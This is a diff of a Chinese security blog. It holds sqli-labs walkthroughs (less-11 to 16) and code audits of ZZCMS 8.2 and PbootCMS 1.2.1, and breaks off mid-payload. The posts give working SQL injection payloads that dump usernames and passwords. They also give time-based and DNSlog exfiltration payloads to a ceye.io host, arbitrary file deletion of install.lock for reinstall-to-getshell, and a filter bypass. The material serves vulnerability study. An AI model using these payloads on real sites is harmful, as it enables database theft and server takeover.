+</code></pre><h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11:"></a>less-11:</h2><p>正确页面:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.20.51.06-image.png" alt="2018-10-28.20.51.06-image.png"></p>
+<p>错误页面:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.20.51.43-image.png" alt="2018-10-28.20.51.43-image.png"></p>
+<p>所以改变下intruder的过滤规则即可,利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.20.53.44-image.png" alt="2018-10-28.20.53.44-image.png"></p>
+<p>我们得到 未加注释符(#)错误  加上注释符正确的符号 即为<code>&#39;</code></p>
+<p>那么这里就开始POST注入:</p>
+<pre><code>uname=xxxx&apos; order by 2%23&amp;passwd=admin&amp;submit=Submit    #得到字段数为2
+uname=xxxx&apos; union select 1,2%23&amp;passwd=admin&amp;submit=Submit #得到显错位
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.21.03.08-image.png" alt="2018-10-28.21.03.08-image.png"></p>
+<pre><code>#得到user:root@localhost database:security
+uname=xxxx&apos; union select user(),database()%23&amp;passwd=admin&amp;submit=Submit 
+
+#得到全部表名emails,referers,uagents,users
+uname=xxxx&apos; union select (select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),2%23&amp;passwd=admin&amp;submit=Submit  
+
+#得到users表下的所有字段名 id,username,password
+uname=xxxx&apos; union select (select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;),2&amp;passwd=admin&amp;submit=Submit  
+
+#得到security库下的users下的username,password内容
+uname=xxxx&apos; union select (select group_concat(username,&apos;:&apos;,password) from security.users),2%23&amp;passwd=admin&amp;submit=Submit
+</code></pre><p>less-11的sql语句为:</p>
+<pre><code>@$sql=&quot;SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1&quot;;
+</code></pre><h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12:"></a>less-12:</h2><p>利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.21.25.38-image.png" alt="2018-10-28.21.25.38-image.png"></p>
+<p>得到闭合符号为<code>&quot;)</code><br>然后把<code>less-11</code>的payload中的闭合符号<code>&#39;</code>变为<code>&quot;)</code>即可注入</p>
+<p>less-12源代码:</p>
+<pre><code>$uname=&apos;&quot;&apos;.$uname.&apos;&quot;&apos;;
+$passwd=&apos;&quot;&apos;.$passwd.&apos;&quot;&apos;; 
+@$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;
+</code></pre><h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13:"></a>less-13:</h2><p>这里正确内容并不会像上面一样返回name及pwd,而会返回错误sql语句和是否登陆成功的信息,所以这里即可使用报错注入或盲注<br>盲注如下:<br>利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.21.30.09-image.png" alt="2018-10-28.21.30.09-image.png"></p>
+<p>得到闭合符号为<code>&#39;)</code></p>
+<p>然后使用报错注入即可,这里列举几个payload:</p>
+<pre><code>uname=admin&apos;) and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23&amp;passwd=admin&amp;submit=Submit
+</code></pre><p>然后将select database()更换为其他查询语句即可得到数据</p>
+<p>盲注参考less-5</p>
+<p>less-13源代码:</p>
+<pre><code>@$sql=&quot;SELECT username, password FROM users WHERE username=(&apos;$uname&apos;) and password=(&apos;$passwd&apos;) LIMIT 0,1&quot;;
+</code></pre><h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14:"></a>less-14:</h2><p>利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.21.53.31-image.png" alt="2018-10-28.21.53.31-image.png"></p>
+<p>正确或错误返回内容与less-13一样 只是闭合符号变为了<code>&quot;</code></p>
+<p>所以只需将less-13的payload中的闭合符<code>&#39;)</code>变为<code>&quot;</code>即可注入</p>
+<p>less-14源代码:</p>
+<pre><code>$uname=&apos;&quot;&apos;.$uname.&apos;&quot;&apos;;
+$passwd=&apos;&quot;&apos;.$passwd.&apos;&quot;&apos;; 
+@$sql=&quot;SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1&quot;;
+</code></pre><h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15:"></a>less-15:</h2><p>利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.21.58.38-image.png" alt="2018-10-28.21.58.38-image.png"></p>
+<p>所以闭合符号为<code>&#39;</code></p>
+<p>正确错误不会返回错误信息,只是不同内容,所以这里用盲注即可   参考less-5即可<br>less-15源代码:</p>
+<pre><code>@$sql=&quot;SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1&quot;;
+</code></pre><h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16:"></a>less-16:</h2><p>利用上面的方法得到正确的闭合符号<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.22.02.01-image.png" alt="2018-10-28.22.02.01-image.png"></p>
+<p>这里的情况与less-5相同,只是闭合符号<code>&#39;</code>变为<code>&quot;)</code></p>
+<p>所以也可以用盲注,将闭合符换为<code>&quot;)</code>即可。</p>
+<p>less-16源代码:</p>
+<pre><code>$uname=&apos;&quot;&apos;.$uname.&apos;&quot;&apos;;
+$passwd=&apos;&quot;&apos;.$passwd.&apos;&quot;&apos;; 
+@$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;
+</code></pre><hr>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/25/ZZCMSV8.2详细审计/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/10/25/ZZCMSV8.2详细审计/" itemprop="url">代码审计 | ZZCMSV8.2详细审计</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-25T08:15:41+08:00">
+                2018-10-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>##<strong>1.安装时配置文件可写入命令导致Getshell</strong>(需要<code>magic_qupte_gpc</code>为<code>off</code>状态)<br>一般这种重装时出现的漏洞,需要配合其他漏洞才能发挥作用(如任意文件删除<code>lock</code>文件导致重装):<br>详情可看笔者发到ichunqiu的文章:<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=44383&amp;page=1#pid500791" target="_blank" rel="noopener">ZZCMS 从任意文件删除至getshell</a></p>
+<p>##<strong>2.多处任意文件删除:</strong><br>这是ZZCMS8.2关于文件操作部分的代码:</p>
+<pre><code>A.
+if ($oldimg&lt;&gt;$img){
+        $f=&quot;../&quot;.$oldimg;
+        if (file_exists($f)){
+        unlink($f);        
+        }
+}
+
+
+B.
+if ($row[&apos;img&apos;]&lt;&gt;&quot;/image/nopic.gif&quot;){
+        $f=&quot;../&quot;.substr($row[&apos;img&apos;],1);
+        if (file_exists($f)){
+        unlink($f);
+        }
+</code></pre><p>  在前台的文件删除最多的就是这两种删除情况,A代码没有对传入的<code>$oldimg</code>进行过滤导致任意文件删除,而B是从数据库提取<code>$row[&#39;img&#39;]</code>再进行删除,经测试,在该CMS中都会造成文件删除。这里只列出漏洞文件与漏洞利用条件,因为代码无外乎上面那两段。</p>
+<p><strong>漏洞利用:</strong><br>A代码部分<br>1.<code>user\adv.php(modify与add方式都存在)</code>payload：</p>
+<pre><code>127.0.0.1:81/user/adv.php?$action=modify
+post:oldimg=install/install.lock
+</code></pre><p>2.<code>licence_save.php(随意添加一个资质,得到id为1)</code>payload：</p>
+<pre><code>http://127.0.0.1:81/user/licence_save.php?action=modify
+post：oldimg=install/install.lock&amp;id=1
+</code></pre><p>在实战中可以直接爆破得到id。<br>另外涉及的文件还有<code>user\manage.php</code>  <code>user\ppsave.php</code>  <code>user\zssave.php</code> <code>ztconfig.php</code></p>
+<p>B代码部分<br>与A的利用方式不同的是,他这里的<code>$row[&#39;img&#39;]</code>是从数据库中提取的,那我们要利用这里进行文件删除的话就需要先把脏数据(要删除的文件)写入数据库,然后再去删除。</p>
+<p>我这里也找到几处存在问题的地方：<br>1.<code>user\del.php:</code><br><img src="http://static.zybuluo.com/chhyx/mrzy5zfl10c4uulo7yitzvht/image_1cqipr8rc1tro19ucr1aql41i1p87.png" alt="image_1cqipr8rc1tro19ucr1aql41i1p87.png-99.5kB"></p>
+<p>那我们就需要找一下在哪里可以插入或者修改zzcms_main表中的img字段值的地方:<br>在<code>user\zssave.php</code>中找见:<br><img src="http://static.zybuluo.com/chhyx/p19ih7qu5a3h93k4e9zqmrp0/image_1cqipskup1f3i13hmmbp1tcc1om48k.png" alt="image_1cqipskup1f3i13hmmbp1tcc1om48k.png-57.4kB"></p>
+<p>那利用就很简单了:<br>先访问:<code>http://127.0.0.1:81/user/zssave.php</code><br>添加时将<code>$img</code>值(或<code>$flv</code>)改为想删除的文件<code>xinstall/install.lock</code>(从下标为1开始取值)<br>然后再访问:</p>
+<pre><code>http://127.0.0.1:81/user/del.php   
+post:id=1&amp;tablename=zzcms_main
+</code></pre><p>即可成功删除<code>install.lock</code>文件,这里的<code>id</code>同样需要爆破</p>
+<p>在<code>user\del.php</code>这个文件下另外一处:</p>
+<p><img src="http://static.zybuluo.com/chhyx/2br5zkprbcxioqp7w223w9h1/image_1cqip94rk1hrtkj2q7u19ud12r63d.png" alt="image_1cqip94rk1hrtkj2q7u19ud12r63d.png-69.5kB"></p>
+<p>在<code>licence_sace.php</code>有往<code>zzcms_licence</code>表写数据的操作<br><img src="http://static.zybuluo.com/chhyx/skavh97q5jwknwnxeybg8p5y/image_1cqipe3aq3iavumtf215i777g6q.png" alt="image_1cqipe3aq3iavumtf215i777g6q.png-118.8kB"><br>操作同上即可利用。</p>
+<p>##<strong>3.多处Sql注入:</strong><br><strong>A.HTTP_CLIENT_IP 注入</strong><br>获取ip的函数<code>getip()</code>无过滤,与笔者前几天分析的<a href="https://p0rz9.github.io/2018/10/21/APPCMS%E8%AF%A6%E7%BB%86%E5%AE%A1%E8%AE%A1/" target="_blank" rel="noopener">代码审计 | APPCMS详细审计</a>中的注入类似。</p>
+<pre><code>#inc\function.php    getip()
+function getip(){ 
+if (getenv(&quot;HTTP_CLIENT_IP&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_CLIENT_IP&quot;), &quot;unknown&quot;)) 
+$ip = getenv(&quot;HTTP_CLIENT_IP&quot;); 
+else if (getenv(&quot;HTTP_X_FORWARDED_FOR&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_X_FORWARDED_FOR&quot;), &quot;unknown&quot;)) 
+$ip = getenv(&quot;HTTP_X_FORWARDED_FOR&quot;); 
+else if (getenv(&quot;REMOTE_ADDR&quot;) &amp;&amp; strcasecmp(getenv(&quot;REMOTE_ADDR&quot;), &quot;unknown&quot;)) 
+$ip = getenv(&quot;REMOTE_ADDR&quot;); 
+else if (isset($_SERVER[&apos;REMOTE_ADDR&apos;]) &amp;&amp; $_SERVER[&apos;REMOTE_ADDR&apos;] &amp;&amp; strcasecmp($_SERVER[&apos;REMOTE_ADDR&apos;], &quot;unknown&quot;)) 
+$ip = $_SERVER[&apos;REMOTE_ADDR&apos;]; 
+else 
+$ip = &quot;unknown&quot;; 
+return ($ip); 
+} 
+</code></pre><p>然后直接搜索用到<code>getip()</code>函数的地方进行利用。</p>
+<pre><code>user\logincheck.php
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/syx67osq7fldj7gt1kzbasgk/image_1cqir6v841j0be6219ru1gheu259e.png" alt="image_1cqir6v841j0be6219ru1gheu259e.png-131.4kB"></p>
+<p>因为这里时无回显的盲注,我们用DNSlog来快速获取数据,<br>不清楚怎么使用的可参考笔者之前的文章。</p>
+<pre><code>client-ip: 1.1.1.1&apos; and ((select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxxxxx.ceye.io\\abc&apos;))))#
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/9gyfrk1tgqc2p1dac1e5hea8/image_1cqis1ttj13t7uibddvstn1kbb9r.png" alt="image_1cqis1ttj13t7uibddvstn1kbb9r.png-104.1kB"></p>
+<p>剩下的还有几处利用点,但大多类似,就不再赘述。</p>
+<p><strong>B.$tablename注入</strong><br>将传入的变量<code>$tablename</code>直接拼接到sql语句中,且无引号包裹,<br><img src="http://static.zybuluo.com/chhyx/25nmbl349o2copgl8mym97tv/image_1cqkek8v7b68ib12kb1k691kjq9.png" alt="image_1cqkek8v7b68ib12kb1k691kjq9.png-18.1kB"></p>
+<p>因为这里并无回显,所以只能利用延时注入或者dnslog带入的方式</p>
+<pre><code>http://127.0.0.1:81/user/del.php
+post:id=2&amp;tablename=zzcms_licence+where+title=100+or+if(1,sleep(2),1)--+
+</code></pre><p>与上面<code>getip()</code>类似。</p>
+<p><strong>C.stripfxg使用错误导致注入</strong><br>在该CMS中还有个危险函数<code>stripfxg()</code>,他的作用就是将已经过滤的数据还原:<br><img src="http://static.zybuluo.com/chhyx/btb1zj08yl388ipts0od8uiu/image_1cqkd93hvihq1usv1spa10ti1iuf2g.png" alt="image_1cqkd93hvihq1usv1spa10ti1iuf2g.png-51.3kB"></p>
+<p>是个危险函数无疑了。搜索调用该函数且带入数据库的地方,找到一处<code>user\msg.php</code>:<br><img src="http://static.zybuluo.com/chhyx/v42tg9owuqsbrtm39wfm3din/image_1cqkct38o1ckp1qo819809l9323.png" alt="image_1cqkct38o1ckp1qo819809l9323.png-123.8kB"></p>
+<p>这里是<code>insert</code>注入,我们可以利用多伪造一组数据的方法,<br>与<a href="https://p0rz9.github.io/2018/10/21/APPCMS%E8%AF%A6%E7%BB%86%E5%AE%A1%E8%AE%A1/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/10/21/APPCMS详细审计/</a>同理：</p>
+<pre><code>http://127.0.0.1:81/user/msg.php?action=savedata&amp;saveas=add
+POST:info_content=xxxxxxx&apos;),((select user()))#&amp;Submit=%E6%8F%90%E4%BA%A4
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/vrxf7778iix0qri6wn4mpgbv/image_1cqke5u0k1fq4l037v810pq13h13d.png" alt="image_1cqke5u0k1fq4l037v810pq13h13d.png-137.1kB"></p>
+<p>还有就是可利用延时注入:</p>
+<pre><code>http://127.0.0.1:81/user/msg.php?action=savedata&amp;saveas=add
+POST:info_content=xxxxxxx&apos;^if(1,sleep(6),0))#&amp;Submit=%E6%8F%90%E4%BA%A4
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/6p3jpkqie8rwnebvjw7veupg/image_1cqkclcimhv21lko1m8l11jtcrfm.png" alt="image_1cqkclcimhv21lko1m8l11jtcrfm.png-140.5kB"></p>
+<p>注入小技巧:</p>
+<pre><code>在碰到insert注入和update注入的时候,除了能够多伪造一组数据以外，还可以使用这种异或符号加上sleep函数来延时注入
+
+insert into user (content)VALUES(&apos;1&apos;^if(1,sleep(5),0))#
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/buipbf0dwmbusowquxf0yxmc/image_1cqkccjja1es612ksqkvs3j9pd9.png" alt="image_1cqkccjja1es612ksqkvs3j9pd9.png-10.7kB"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1588,879 +2524,6 @@ select sleep(find_in_set(mid((select name from user where id=2), 1, 1), &apos;0,
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/15/PbootCMS_V1.2.1详细审计SQL注入/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/10/15/PbootCMS_V1.2.1详细审计SQL注入/" itemprop="url">代码审计 | PbootCMS_V1.2.1详细审计SQL注入</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-15T08:15:41+08:00">
-                2018-10-15
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>之前几周复现审计文章,但是轮到自己去挖掘的时候还是两眼黑,感谢P师傅的指点,成功学习了一波,记录下来,希望自己早日进阶代码审计。</p>
-</blockquote>
-<hr>
-<blockquote>
-<p>一.前期收集审计信息</p>
-</blockquote>
-<p><strong>1.部署CMS</strong><br><code>PbootCMS</code>部署是很方便的,直接下载下来即可使用,但是系统默认使用<code>sqlite</code>的,因为笔者用<code>mysql</code>用的比较多,那这里我就以<code>mysql</code>数据库安装来跑程序。在<code>config\database.php</code></p>
-<p><img src="http://static.zybuluo.com/chhyx/tfjaax218vlz4iaj05vy8m28/image_1cpp8jqdc7mrhtd8mj1f311htf19.png" alt="image_1cpp8jqdc7mrhtd8mj1f311htf19.png-97.3kB"></p>
-<p>然后自己创建数据库<code>pbootcms</code>,导入<code>static\backup\sql\20180720164810_pbootcms.sql</code>的sql语句并执行,看到下面内容就表明数据库部署成功<br><img src="http://static.zybuluo.com/chhyx/57n9bc88jdbb3dfi5kyxslqu/image_1cpp8o9a954m1t1rnrhatv82k1m.png" alt="image_1cpp8o9a954m1t1rnrhatv82k1m.png-30.7kB"><br>然后重新打开网站 看到如下内容表明<code>PbootCMS</code>部署成功<br><img src="http://static.zybuluo.com/chhyx/wow4n0eyjmgjmkmlcel2lmvp/image_1cpp8s3l61169stgg4m1p271m5j2j.png" alt="image_1cpp8s3l61169stgg4m1p271m5j2j.png-857.4kB"></p>
-<p><strong>2.分析系统整体架构:</strong></p>
-<pre><code>PbootCMS-V1.2.1
-├─ apps         应用程序
-│  ├─ admin     后台模块
-│  ├─ api       api模块
-│  ├─ common    公共模块
-│  ├─ home      前台模块
-├─ config       配置文件
-│  ├─ config.php    配置文件
-│  ├─ database.php  数据库配置文件
-│  ├─ route.php     用户自定义路由规则
-├─ core         框架核心
-│  ├─ function  框架公共函数库
-│  │  ├─ handle.php 助手函数库1
-│  │  ├─ helper.php 助手函数库2
-├─ template     html模板
-├─ admin.php    管理端入口文件
-├─ api.php      api入口文件
-├─ index.php    前端入口文件
-</code></pre><p>这里列出一些重要的目录,可快速了解系统,有3个入口文件(<code>admin.php,api.phpi,ndex.php</code>)分别对应<code>apps</code>目录下的几个模块(<code>admin,api,home</code>)</p>
-<p><strong>3.确定路由走向</strong><br>经过初步测试,路由走向主要分为自定义路由跟普通MVC模式路由模式。<br>自定义路由:<br>查看路由文件 <code>apps\common\route.php</code><br><img src="http://static.zybuluo.com/chhyx/bk5dzuwptrot91ztl3ihidvu/image_1cpp986o17ian8je3v6hd17713d.png" alt="image_1cpp986o17ian8je3v6hd17713d.png-121kB"></p>
-<p>举个例子:</p>
-<pre><code>http://127.0.0.1/index.php/list/11
-</code></pre><p>经过上面系统自定义路由解析后访问的是</p>
-<pre><code>http://127.0.0.1/home/list/index/scode/11
-</code></pre><p>定位:<code>home</code>模块<code>list</code>控制器<code>index</code>方法<code>scode</code>参数</p>
-<p>普通MVC模式:<br>对于上面没有自定义的路由规则来说,直接按照MVC模式访问即可<br>例如:</p>
-<pre><code>http://127.0.0.1:89/index.php/Message/add
-</code></pre><p>定位:<code>apps\home\controller\MessageController.php</code>的<code>add()</code>方法</p>
-<p><strong>4.系统参数过滤情况</strong><br>a.原生态的<code>GET,POST,REQUEST</code>过滤情况<br>找一处外部可访问的地方按如下方式测试即可:<br><img src="http://static.zybuluo.com/chhyx/j2gwd0qtkf9wezdhp9q7u4wz/image_1cplpaupq1u6m1sjvtrk157tksi9.png" alt="image_1cplpaupq1u6m1sjvtrk157tksi9.png-112.5kB"></p>
-<p>根据浏览器输出我们可知原生态的获取数据方式是完全不过滤的</p>
-<p>b.系统自带函数<code>get,post,request,cookie</code>过滤情况:</p>
-<pre><code>#core\function\help.php
-function get(
-function post(
-function request(
-function cookie(
-</code></pre><p>这里前3个函数都会调用<code>filter()</code>进行过滤,<code>filter()</code>会调用<code>escape_string()</code>函数,<code>Cookie</code>是直接进行<code>escape_string()</code>过滤</p>
-<pre><code>#core\functionhandle.php
-function escape_string($string, $dropStr = true)
-{
-    if (! $string)
-        return $string;
-    if (is_array($string)) { // 数组处理
-        foreach ($string as $key =&gt; $value) {
-            $string[$key] = escape_string($value);
-        }
-    } elseif (is_object($string)) { // 对象处理
-        foreach ($string as $key =&gt; $value) {
-            $string-&gt;$key = escape_string($value);
-        }
-    } else { // 字符串处理
-        if ($dropStr) {
-            $string = preg_replace(&apos;/(0x7e)|(0x27)|(0x22)|(updatexml)|(extractvalue)|(name_const)|(concat)/i&apos;, &apos;&apos;, $string);
-        }
-        $string = htmlspecialchars(trim($string), ENT_QUOTES, &apos;UTF-8&apos;);
-        $string = addslashes($string);
-    }
-    return $string;
-}
-</code></pre><p>根据代码我们可以看到<br>0x1.首先这里经过了<code>preg_replace</code>正则匹配,对一些敏感词汇进行了过滤<br>0x2.<code>htmlspecialchars()</code>函数html实体编码(单双引号都过滤)<br>0x3.<code>addslashes()</code>函数转义</p>
-<p>注意:<br>这里的过滤只针对<code>value</code>而<code>key</code>完全无过滤<br>正则绕过很简单,只需要<code>updateupdatexmlxml</code>即可绕过</p>
-<p>因为这里绕过<code>html编码</code>与<code>addslashes()</code>函数而进行sql注入不现实<br>所以我们将重点放在key上面</p>
-<p><strong>5.了解系统DB类,数据库底层的操作方法</strong><br>这里涉及代码太多,我们只需要对一些关键的地方进行了解即可</p>
-<pre><code>#PbootCMS\core\basic\Model.php
-</code></pre><p>通过读DB底层操作代码发现这里大部分都是字符串拼接,只要可以带入’或<code>即可注入。因为在value处注入不现实,现在我们把重点放在可控的数组上--&gt;寻找参数可为数组且用</code>key`直接拼接的操作方法</p>
-<p>这里找到 <code>table()  name() field() where() order() insert() insertGetId() (调用的insert方法)  update()</code>等具有“漏洞”的操作</p>
-<blockquote>
-<p><strong>二.漏洞寻找及利用</strong></p>
-</blockquote>
-<p>这里咱们咱们重点关注前台sql注入<br>搜索方法:<br>  <strong>0x01.</strong>在<code>home\controller</code>中查找直接调用上述操作方法的函数—&gt;构建<code>sql</code><br>  <strong>0x02.</strong>在<code>home\model</code>查找调用上述操作方法的函数<code>a()</code>–&gt;返回<code>home\controller</code>中再次寻找调用<code>a()</code>函数的方法—&gt;构建<code>sql</code><br>  <strong>0x03.</strong>在公共函数库<code>apps\common</code>查找调用上述操作方法的函数<code>b()</code>–&gt;返回<code>home\controller</code>中寻找调用<code>b()</code>函数的方法—&gt;构建<code>sql</code></p>
-<p>经过上面的前期审计分析,我们心中已经有了*数,接下来就是调试构造即可,这里就以实际挖掘的过程来讲解吧。</p>
-<p>##<strong>1.Insert 注入一</strong><br><strong>代码分析:</strong><br>笔者本地测试关闭了验证码的验证,在实战中利用填写正确的验证码即可。<br>搜索<code>insert()</code>–&gt;在<code>home\model\ParserModel.php</code>找到<code>addMessage()</code>函数调用了<code>insert()</code>操作</p>
-<pre><code>public function addMessage($data)
-{
-    return parent::table(&apos;ay_message&apos;)-&gt;autoTime()-&gt;insert($data);
-}
-</code></pre><p>我们在搜索下<code>home\controller</code>哪里调用了<code>addMessage()</code>函数,在<code>MessageController.php</code>找到<code>add()</code>方法:</p>
-<pre><code>public function add()
-    {
-        if ($_POST) {
-        ...
-        // 接收数据
-        $mail_body = &apos;&apos;;
-        foreach ($form as $value) {
-            $field_data = post($value-&gt;name);
-            if (is_array($field_data)) { // 如果是多选等情况时转换
-                $field_data = implode(&apos;,&apos;, $field_data);
-            }
-            if ($value-&gt;required &amp;&amp; ! $field_data) {
-                alert_back($value-&gt;description . &apos;不能为空！&apos;);
-            } else {
-                $data[$value-&gt;name] = post($value-&gt;name);
-                $mail_body .= $value-&gt;description . &apos;：&apos; . post($value-&gt;name) . &apos;&lt;br&gt;&apos;;
-            }
-        }
-        ...
-
-        if ($this-&gt;model-&gt;addMessage($data)) {
-            ...
-        }
-    }
-</code></pre><p>这里的<code>$data[$value-&gt;name] = post($value-&gt;name);</code>表明将POST提交的数组直接赋值给<code>$data</code>–&gt;进入<code>addmessage()---&gt;inert()</code> 造成注入。</p>
-<p><strong>payload:</strong></p>
-<pre><code>url: http://127.0.0.1:89/index.php/Message/add
-POST: contacts[id`) values (1 and updatexml(1,concat(0x7e,user(),1),1)); -- a]=1&amp;content=1&amp;mobile=1
-</code></pre><p><strong>漏洞利用:</strong><br><img src="http://static.zybuluo.com/chhyx/ka58v3fqgjjbual6zb6mcq4c/image_1cpn0rgnj169h14k21ag1ulrksd9.png" alt="image_1cpn0rgnj169h14k21ag1ulrksd9.png-120.3kB"></p>
-<p>##<strong>2.Insert 注入二</strong><br>注意:本地测试时,需要添加一条数据才能注入,真实环境下,如果开放这个通话功能时即可直接注入<br><strong>代码分析:</strong><br>A.这里继续寻找在<code>home\Model</code>中寻找调用<code>insert</code>操作的函数,发现函数<code>addForm()</code></p>
-<pre><code>#home\Model\ParserModel.php  addForm()
-public function addForm($table, $data)
-{
-    return parent::table($table)-&gt;insert($data);
-}
-</code></pre><p>我们在搜索下<code>home\controller</code>中调用<code>addForm()</code>函数的方法,在<code>FormController.php</code>找到<code>add()</code>方法:</p>
-<pre><code>#home\controller\FormController.php add()
-public function add()
-{
-    if ($_POST) {
-        ...
-    if ($fcode == 1) {
-            alert_back(&apos;表单提交地址有误，留言提交请使用留言专用地址!&apos;);
-        }
-        ...
-    if (! $form = $this-&gt;model-&gt;getFormField($fcode)) {
-        alert_back(&apos;接收表单不存在任何字段，请核对后重试！&apos;);
-    }
-    foreach ($form as $value) {
-        $field_data = post($value-&gt;name);
-        if (is_array($field_data)) { // 如果是多选等情况时转换
-            $field_data = implode(&apos;,&apos;, $field_data);
-            }
-        if ($value-&gt;required &amp;&amp; ! $field_data) {
-            alert_back($value-&gt;description . &apos;不能为空！&apos;);
-        } else {
-            $data[$value-&gt;name] = post($value-&gt;name);
-            $mail_body .= $value-&gt;description . &apos;：&apos; . post($value-&gt;name) . &apos;&lt;br&gt;&apos;;
-            }
-        }
-        ...
-    if ($this-&gt;model-&gt;addForm($value-&gt;table_name, $data)) {
-</code></pre><p>跟进<code>getFormField()</code>查看:</p>
-<pre><code>    public function getFormField($fcode)
-{   ...
-    return parent::table(&apos;ay_form a&apos;)-&gt;field($field)
-        -&gt;where(&quot;a.fcode=&apos;$fcode&apos;&quot;)
-        -&gt;join($join)
-        -&gt;order(&apos;b.sorting ASC,b.id ASC&apos;)
-        -&gt;select();
-}
-</code></pre><p><code>fcode</code>为<code>ay_form</code>表的一个字段,只要<code>fcode</code>为2的字段存在即可注入<br>这里的<code>$data[$value-&gt;name] = post($value-&gt;name);</code>表明将<code>POST</code>提交的数组直接赋值给<code>$data--&gt;addForm()---&gt;inert()</code> 造成注入。</p>
-<p><strong>payload:</strong></p>
-<pre><code>url: http://127.0.0.1:89/index.php/Form/add?fcode=2
